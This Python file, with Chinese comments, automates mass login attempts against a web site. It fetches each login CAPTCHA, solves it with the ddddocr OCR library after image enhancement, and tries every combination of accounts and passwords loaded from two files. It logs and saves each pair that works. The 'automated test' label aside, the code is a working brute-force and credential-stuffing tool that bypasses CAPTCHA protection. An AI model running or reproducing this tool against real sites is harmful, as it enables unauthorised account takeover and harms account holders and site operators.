# ddddocr_captcha_optimized.py
import requests
import base64
import json
import ddddocr
import time
import os
import logging
import signal
import sys
from urllib.parse import urljoin
from PIL import Image, ImageFilter, ImageEnhance
import io

# 导入配置文件
from config import get_config

# 获取配置
Config = get_config()

class DDDDOCRCaptchaSolver:
    def __init__(self, base_url=None):
        self.base_url = base_url or Config.BASE_URL
        self.session = requests.Session()
        self.logger = self._setup_logging()
        self.should_stop = False
        
        # 初始化 ddddocr
        try:
            self.ocr = ddddocr.DdddOcr(show_ad=False)
            self.logger.info("ddddocr 初始化成功")
        except Exception as e:
            self.logger.error(f"ddddocr 初始化失败: {e}")
            raise
        
        # 设置请求头
        self.session.headers.update({
            'User-Agent': Config.USER_AGENT,
            'X-Requested-With': 'XMLHttpRequest',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'DNT': '1',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6'
        })
        
        # 设置信号处理
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def _setup_logging(self):
        """设置日志系统"""
        logger = logging.getLogger(__name__)
        
        if not logger.handlers:
            logger.setLevel(getattr(logging, Config.LOG_LEVEL))
            
            formatter = logging.Formatter(Config.LOG_FORMAT)
            
            # 控制台处理器
            console_handler = logging.StreamHandler(sys.stdout)
            console_handler.setFormatter(formatter)
            logger.addHandler(console_handler)
            
            # 文件处理器
            if Config.LOG_TO_FILE:
                file_handler = logging.FileHandler(
                    f'captcha_solver_{time.strftime("%Y%m%d_%H%M%S")}.log',
                    encoding='utf-8'
                )
                file_handler.setFormatter(formatter)
                logger.addHandler(file_handler)
        
        return logger
    
    def signal_handler(self, signum, frame):
        self.logger.info("收到中断信号，正在停止...")
        self.should_stop = True
    
    def preprocess_image(self, image_data):
        """图像预处理增强识别率"""
        if not Config.ENABLE_IMAGE_PREPROCESSING:
            return image_data
            
        try:
            image = Image.open(io.BytesIO(image_data))
            
            # 转换为灰度图
            if image.mode != 'L':
                image = image.convert('L')
            
            # 增强对比度
            enhancer = ImageEnhance.Contrast(image)
            image = enhancer.enhance(Config.CONTRAST_ENHANCE)
            
            # 锐化图像
            if Config.ENABLE_SHARPEN:
                image = image.filter(ImageFilter.SHARPEN)
            
            # 调整大小（如果图像太小）
            if Config.ENABLE_RESIZE and image.size[0] < 100:
                new_size = (image.size[0] * Config.RESIZE_FACTOR, 
                           image.size[1] * Config.RESIZE_FACTOR)
                image = image.resize(new_size, Image.Resampling.LANCZOS)
            
            # 保存处理后的图像到内存
            output = io.BytesIO()
            image.save(output, format='PNG')
            return output.getvalue()
            
        except Exception as e:
            self.logger.warning(f"图像预处理失败，使用原图: {e}")
            return image_data
    
    def get_captcha_image(self, retry_count=Config.MAX_RETRY_COUNT):
        """获取验证码图片（带重试机制）"""
        for attempt in range(retry_count):
            if self.should_stop:
                return None, None
                
            try:
                url = urljoin(self.base_url, Config.CAPTCHA_API)
                self.logger.debug(f"尝试获取验证码 (第 {attempt + 1} 次)")
                
                response = self.session.get(url, timeout=Config.REQUEST_TIMEOUT)
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get('resultCode') == 0:
                        result_data = data.get('resultData', {})
                        code_id = result_data.get('CodeID')
                        captcha_url = result_data.get('Url')
                        
                        if captcha_url and captcha_url.startswith('data:image'):
                            base64_data = captcha_url.split(',')[1]
                            self.logger.info(f"成功获取验证码，CodeID: {code_id}")
                            return code_id, base64_data
                
                self.logger.warning(f"获取验证码失败，状态码: {response.status_code}")
                
            except requests.exceptions.Timeout:
                self.logger.warning(f"获取验证码超时 (第 {attempt + 1} 次)")
            except Exception as e:
                self.logger.error(f"获取验证码异常 (第 {attempt + 1} 次): {e}")
            
            # 如果不是最后一次尝试，等待后重试
            if attempt < retry_count - 1 and not self.should_stop:
                time.sleep(Config.RETRY_DELAY)
        
        self.logger.error("获取验证码失败，已达最大重试次数")
        return None, None
    
    def clean_ocr_result(self, text):
        """清理OCR识别结果"""
        if not text:
            return None
        
        # 只保留字母和数字
        cleaned = ''.join(filter(str.isalnum, text))
        
        # 确保长度正确
        if len(cleaned) == Config.CAPTCHA_LENGTH:
            return cleaned.upper()
        elif len(cleaned) > Config.CAPTCHA_LENGTH:
            self.logger.warning(f"识别结果过长: {cleaned} -> {cleaned[:Config.CAPTCHA_LENGTH]}")
            return cleaned[:Config.CAPTCHA_LENGTH].upper()
        elif len(cleaned) < Config.CAPTCHA_LENGTH and len(cleaned) > 0:
            # 补足到指定长度
            padded = cleaned.ljust(Config.CAPTCHA_LENGTH, 'X')[:Config.CAPTCHA_LENGTH]
            self.logger.warning(f"识别结果过短: {cleaned} -> {padded}")
            return padded.upper()
        else:
            return None
    
    def is_valid_captcha_format(self, text):
        """检查识别结果是否符合预期格式"""
        return (text is not None and 
                len(text) == Config.CAPTCHA_LENGTH and 
                text.isalnum())
    
    def recognize_with_ddddocr(self, base64_data):
        """使用 ddddocr 识别验证码"""
        try:
            # 解码base64数据
            image_data = base64.b64decode(base64_data)
            
            # 图像预处理
            processed_image_data = self.preprocess_image(image_data)
            
            # 直接使用 ddddocr 识别
            result = self.ocr.classification(processed_image_data)
            
            # 清理结果
            cleaned_result = self.clean_ocr_result(result)
            
            self.logger.info(f"ddddocr 识别结果: 原始={result}, 清理后={cleaned_result}")
            
            if self.is_valid_captcha_format(cleaned_result):
                return cleaned_result
            else:
                self.logger.warning(f"识别结果格式无效: {cleaned_result}")
                return None
                
        except Exception as e:
            self.logger.error(f"ddddocr 识别失败: {e}")
            return None
    
    def save_captcha_for_analysis(self, base64_data, recognized_text, success=None):
        """保存验证码图片用于分析"""
        if not Config.SAVE_CAPTCHA_IMAGES:
            return
            
        try:
            image_data = base64.b64decode(base64_data)
            status = "success" if success else "failed"
            filename = f"captcha_{recognized_text}_{status}_{int(time.time())}.png"
            
            with open(filename, 'wb') as f:
                f.write(image_data)
                
            self.logger.debug(f"验证码已保存: {filename}")
        except Exception as e:
            self.logger.error(f"保存验证码失败: {e}")
    
    def test_login(self, account, password):
        """测试登录"""
        if self.should_stop:
            return False, "用户中断"
        
        # 获取验证码
        code_id, captcha_base64 = self.get_captcha_image()
        if not code_id or not captcha_base64:
            return False, "验证码获取失败"
        
        # 使用 ddddocr 识别验证码
        captcha_code = self.recognize_with_ddddocr(captcha_base64)
        
        if not captcha_code:
            self.save_captcha_for_analysis(captcha_base64, "unknown", False)
            return False, "验证码识别失败"
        
        self.logger.info(f"使用验证码: {captcha_code}, CodeID: {code_id}")
        
        # 执行登录
        try:
            login_data = {
                'account': account,
                'password': password,
                'Code': captcha_code,
                'CodeID': code_id
            }
            
            login_url = urljoin(self.base_url, Config.LOGIN_API)
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
            }
            
            self.logger.debug(f"发送登录请求: account={account}")
            response = self.session.post(login_url, data=login_data, 
                                       headers=headers, timeout=Config.REQUEST_TIMEOUT)
            
            if response.status_code == 200:
                result = response.json()
                success = result.get('resultCode') == 0
                message = result.get('resultMessage', '未知')
                
                # 保存验证码用于后续分析
                self.save_captcha_for_analysis(captcha_base64, captcha_code, success)
                
                return success, message
            else:
                self.save_captcha_for_analysis(captcha_base64, captcha_code, False)
                return False, f"请求失败: {response.status_code}"
                
        except Exception as e:
            self.save_captcha_for_analysis(captcha_base64, captcha_code, False)
            return False, f"登录异常: {e}"

class DDDDOCRAutoLogin:
    def __init__(self, base_url=None):
        self.captcha_solver = DDDDOCRCaptchaSolver(base_url)
        self.logger = self.captcha_solver.logger
        self.results = []
    
    def check_files_exist(self):
        """检查必要的文件是否存在"""
        if not os.path.exists(Config.ACCOUNT_FILE):
            self.logger.error(f"账号文件 {Config.ACCOUNT_FILE} 不存在")
            return False
            
        if not os.path.exists(Config.PASSWORD_FILE):
            self.logger.error(f"密码文件 {Config.PASSWORD_FILE} 不存在")
            return False
            
        return True
    
    def load_accounts_and_passwords(self):
        """加载账号密码"""
        try:
            if not self.check_files_exist():
                return [], []
            
            with open(Config.ACCOUNT_FILE, 'r', encoding='utf-8') as f:
                accounts = [line.strip() for line in f if line.strip()]
            
            with open(Config.PASSWORD_FILE, 'r', encoding='utf-8') as f:
                passwords = [line.strip() for line in f if line.strip()]
            
            self.logger.info(f"✓ 加载了 {len(accounts)} 个账号和 {len(passwords)} 个密码")
            return accounts, passwords
            
        except FileNotFoundError as e:
            self.logger.error(f"文件不存在: {e}")
            return [], []
        except PermissionError as e:
            self.logger.error(f"文件权限错误: {e}")
            return [], []
        except Exception as e:
            self.logger.error(f"读取文件时发生未知错误: {e}")
            return [], []
    
    def run_automated_test(self):
        """运行自动化测试"""
        accounts, passwords = self.load_accounts_and_passwords()
        if not accounts or not passwords:
            self.logger.error("账号或密码列表为空，无法继续测试")
            return
        
        total_attempts = len(accounts) * len(passwords)
        
        self.logger.info(f"\n🚀 开始 ddddocr 自动化登录测试")
        self.logger.info(f"目标网站: {self.captcha_solver.base_url}")
        self.logger.info(f"总测试组合: {total_attempts}")
        self.logger.info(f"使用的识别引擎: ddddocr")
        self.logger.info("=" * 60)
        
        current_attempt = 0
        start_time = time.time()
        
        for i, account in enumerate(accounts):
            if self.captcha_solver.should_stop:
                break
                
            for j, password in enumerate(passwords):
                if self.captcha_solver.should_stop:
                    break
                    
                current_attempt = i * len(passwords) + j + 1
                progress = current_attempt / total_attempts * 100
                
                self.logger.info(f"\n[进度: {current_attempt}/{total_attempts} ({progress:.1f}%)]")
                self.logger.info(f"测试组合: 账号='{account}' 密码='{password}'")
                
                # 测试登录
                success, message = self.captcha_solver.test_login(account, password)
                
                if success:
                    self.logger.info("🎉 登录成功！")
                else:
                    self.logger.info(f"❌ 登录失败: {message}")
                
                self.results.append({
                    'account': account,
                    'password': password,
                    'success': success,
                    'message': message,
                    'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                })
                
                # 延迟避免请求过快
                if current_attempt < total_attempts and not self.captcha_solver.should_stop:
                    time.sleep(Config.DELAY_BETWEEN_REQUESTS)
        
        # 生成报告
        elapsed_time = time.time() - start_time
        self.generate_report(elapsed_time)
    
    def generate_report(self, elapsed_time):
        """生成测试报告"""
        if not self.results:
            self.logger.warning("没有测试结果可生成报告")
            return
        
        total_count = len(self.results)
        success_count = sum(1 for r in self.results if r['success'])
        
        print(f"\n{'='*80}")
        print("ddddocr 测试报告")
        print(f"{'='*80}")
        
        print(f"测试时间: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"耗时: {elapsed_time:.1f} 秒")
        print(f"总测试组合: {total_count}")
        print(f"成功登录: {success_count}")
        print(f"失败登录: {total_count - success_count}")
        
        if total_count > 0:
            success_rate = success_count / total_count * 100
            print(f"成功率: {success_rate:.1f}%")
            print(f"平均每个请求耗时: {elapsed_time/total_count:.1f} 秒")
        
        # 显示成功组合
        success_results = [r for r in self.results if r['success']]
        if success_results:
            print(f"\n🎉 成功的账号密码组合 ({len(success_results)} 个):")
            for result in success_results:
                print(f"  账号: {result['account']} | 密码: {result['password']}")
        else:
            print(f"\n❌ 没有成功的登录组合")
            
            # 分析失败原因
            error_counts = {}
            for result in self.results:
                error_msg = result['message']
                error_counts[error_msg] = error_counts.get(error_msg, 0) + 1
            
            print(f"\n失败原因统计:")
            for error_msg, count in sorted(error_counts.items(), key=lambda x: x[1], reverse=True):
                percentage = count / total_count * 100
                print(f"  {error_msg}: {count}次 ({percentage:.1f}%)")
        
        # 保存详细报告
        if Config.GENERATE_DETAILED_REPORT:
            self.save_detailed_report(elapsed_time, total_count, success_count)
    
    def save_detailed_report(self, elapsed_time, total_count, success_count):
        """保存详细报告到文件"""
        try:
            report_file = f"{Config.REPORT_FILENAME_PREFIX}_{time.strftime('%Y%m%d_%H%M%S')}.txt"
            
            with open(report_file, 'w', encoding='utf-8') as f:
                f.write("ddddocr 登录测试报告\n")
                f.write("="*50 + "\n")
                f.write(f"测试时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"目标网站: {self.captcha_solver.base_url}\n")
                f.write(f"识别引擎: ddddocr\n")
                f.write(f"耗时: {elapsed_time:.1f} 秒\n")
                f.write(f"总测试组合: {total_count}\n")
                f.write(f"成功登录: {success_count}\n")
                f.write(f"失败登录: {total_count - success_count}\n")
                
                if total_count > 0:
                    success_rate = success_count / total_count * 100
                    f.write(f"成功率: {success_rate:.1f}%\n")
                    f.write(f"平均每个请求耗时: {elapsed_time/total_count:.1f} 秒\n\n")
                
                success_results = [r for r in self.results if r['success']]
                if success_results:
                    f.write("成功的组合:\n")
                    for result in success_results:
                        f.write(f"账号: {result['account']} | 密码: {result['password']} | 时间: {result['timestamp']}\n")
                    f.write("\n")
                
                f.write("详细结果:\n")
                for result in self.results:
                    status = "成功" if result['success'] else "失败"
                    f.write(f"账号: {result['account']} | 密码: {result['password']} | 状态: {status} | 信息: {result['message']} | 时间: {result['timestamp']}\n")
            
            self.logger.info(f"详细报告已保存到: {report_file}")
            
        except Exception as e:
            self.logger.error(f"保存报告失败: {e}")

def main():
    try:
        print("🚀 ddddocr 验证码识别系统 (优化版)")
        print("使用先进的深度学习模型进行验证码识别")
        print("按 Ctrl+C 可随时中断测试\n")
        
        # 可以选择不同的环境配置
        # from config import use_development_config
        # use_development_config()
        
        login_system = DDDDOCRAutoLogin()
        login_system.run_automated_test()
        
    except KeyboardInterrupt:
        print("\n\n用户中断程序")
    except Exception as e:
        logging.error(f"程序执行异常: {e}")
    finally:
        print("\n程序执行完毕")

if __name__ == "__main__":
    main()